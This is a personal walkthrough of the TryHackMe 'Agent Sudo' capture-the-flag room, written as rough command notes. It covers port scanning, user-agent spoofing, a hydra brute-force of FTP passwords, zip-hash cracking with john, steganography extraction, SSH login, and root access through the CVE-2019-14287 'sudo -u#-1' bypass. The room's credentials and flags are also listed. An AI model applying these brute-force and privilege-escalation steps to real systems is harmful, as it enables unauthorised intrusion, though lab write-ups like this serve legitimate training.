https://tryhackme.com/room/agentsudoctf

#CTF 
## Enumerate

Enumerate the machine and get all the important information
- start AttackBox
- Start Machine

```
export IP='10.10.x.x'

nmap -sS -sV $IP

21/ftp vsftpd 3.0.3
22/ssh openssh 7.6p1 Ubuntu 4ubuntu0.3
80/http Apache httpd 2.4.29 ubuntu

website: codename as user-agent from agent R

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,py,css,js,php

/index.php

open burpsuite
User-Agent: R  (replacing Mozilla/5.0 ...)
Send Request

Repeater Tab --
Response window
	What are you doing! Are you one of the 25 employees? If not, I going to report this incident

#-- we are agent R, 25 other letters to try

Request
	User-Agent: C
Response
	Location: agent_c_attention.php     copy

Request
	GET /agent_C_attention.php HTTP/1.1
	Location: 10.10.133.9
	User-Agent: C
Response
	Attention Chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also change your god damn passord is weak. From Agent R.
	
```

## Hash Cracking

```
# chris username, weak password
# ftp password, port 21 ftp = open, version vsftpd 3.0.3

hydra -t4 -l chris -P /usr.share/wordlists/rockyou.txt ftp://$IP

ftp = chris : crystal

login
	ftp $IP 21

ls
	To_agentJ.txt
	cute-alien.jpg
	cutie.png

mget *   hit ENTER 3 times
exit

cat To_agentJ.txt
	Dear agent J, all these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. it shouldn't be a problem for you. From Agent C

# hidden in picture => xxd, strings
cutie.png
	To_agentR.txt
	To_agentR.txt

# use binwalk to extract
binwalk -e cutie.png
	zip file
	zlib
cd _cutie.png.extracted/
	365  365.zlib  8702.zip  To_agentR.txt

# zip file password, hint= Mr John

zip2john 8702.zip > unzipped.txt
john --format=zip unzipped.txt

alien

cat unzipped.txt

61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e

# "base64" -- 
Area51

# https://futureboy.us/stegano/decinput.html
upload the Alien.png > Area51 
	james :  hackerrules!

ssh james@$IP
ls
	Alien_autospy.jpg 
	user_flag.txt       b03d975e8c92a7c04146cfa7a5a313c7

# download the Alien picture
sudo scp jame@$IP:Alien_autospy.jpg ~/

sudo scp james@10.10.148.247:Alien_autospy.jpg ~/
scp Alien_autospy.jpg james@10.10.x.x:~/ ~/
scp test.txt jayesh@10.143.90.2:/home/jayesh
scp user@remotehost:/home/user/file_name

# reverse image search
Roswell alien autopsy

sudo -l
	(ALL, !root) /bin/bash

# exploitDB 
# browser: (ALL, !root) /bin/bash  -> exploitDB
CVE-2019-14287

# exploit
sudo -u#-1 /bin/bash       >> root!
cd /root/
root.txt
	b53a02f55b57d4439e3341834d70c062
	DesKel "Agent R"

```

- https://medium.com/@muhduwais/tryhackme-agent-sudo-1a6f8915c74c

